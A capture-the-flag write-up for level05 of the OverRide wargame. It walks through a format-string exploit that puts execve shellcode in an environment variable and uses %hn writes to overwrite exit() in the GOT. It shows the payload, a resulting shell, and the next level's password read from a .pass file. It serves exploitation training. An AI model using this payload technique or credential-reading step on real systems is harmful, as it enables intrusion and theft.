At first glance, it seems that this program simply converts uppercase letters 
to lowercase using XOR with 32, while containing a format string attack vulnerability:

```C
#include <unistd.h>
#include <stdio.h>

int main(int argc, const char **argv, const char **envp)
{
  char s[100];
  unsigned int i;

  i = 0;
  fgets(s, 100, stdin);
  for (i = 0; i < strlen(s); ++i)
  {
    if (s[i] > 64 && s[i] <= 90)
      s[i] ^= 32;
  }
  printf(s);
  exit(0);
}
```

So let's try a simple GOT overwrite of `exit()` with a shellcode.

Here is the address of `exit()`:
```bash
level05@OverRide:~$ objdump -R ./level05 

./level05:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
080497c4 R_386_GLOB_DAT    __gmon_start__
080497f0 R_386_COPY        stdin
080497d4 R_386_JUMP_SLOT   printf
080497d8 R_386_JUMP_SLOT   fgets
080497dc R_386_JUMP_SLOT   __gmon_start__
080497e0 R_386_JUMP_SLOT   exit
080497e4 R_386_JUMP_SLOT   __libc_start_main
```
`exit()` is at `0x080497e0`.

Let's use the shellcode from previous exercises:
```bash
level05@OverRide:~$ export EXPLOIT=$(python -c 'print "\x90" * 150 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```

We control the 10th formatter:
```bash
level05@OverRide:~$ ./level05 
aaaabbbbcccc %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x %08x
aaaabbbbcccc 00000064 f7fcfac0 f7ec3add ffffd63f ffffd63e 00000000 ffffffff ffffd6c4 f7fdb000 61616161 62626262 63636363
```
Our shellcode in gdb is at `0xffffd841`, more precisely, 8 characters later at `0xffffd849`.
```bash
0xffffd841:	 "EXPLOIT=\220\220\220\220\220\220\220\220 ... \061\311\367\341Qh//shh/bin\211\343\260\v̀"
```
So let's take an address a bit further into the NOP sled, such as: `0xffffd861`

As usual:

- We convert the address of our buffer to decimal to replace the address of `exit()`
- We subtract the number of characters written from this decimal address
- We write the address of `exit()` at the beginning of the payload

`0xffffd861` = 4294957153

4294957153 - 4 = 4294957149

Here is our payload:
```bash
(python -c 'print "\xe0\x97\x04\x08" + "%4294957149d%10$n"'; cat) | ./level05
```

However, it doesn't work 🤡 It seems that the value is too high since it is possible to write with smaller values. 
So, we can use the `%hn` or `%hhn` flags to write respectively on 2 bytes and 1 byte.

To use `%hn`, we just need to split the buffer address into two parts: `ffff` and `d861`.

Since we are in little endian, we start with the last value and subtract the sum of the characters written before the formatter. 
Then, we subtract the first value from `ffff`. Here's the calculation:

0xffffd861 = 65535 55393, so in little endian: `55393 65535`

0xd861 = 55393

55393 - 8 = 55385 ← **First value**

0xffff = 65535

65535 - 55393 = 10142 ← **Second value**

We write these two values at addresses `0x080497e0` (the beginning of the exit address in the GOT) 
and `0x080497e2` (2 bytes further).

This gives us:
```bash
(python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55385d%10$hn" + "%10142d%11$hn"'; cat) | ./level05

...

whoami
level06
cat /home/users/level06/.pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
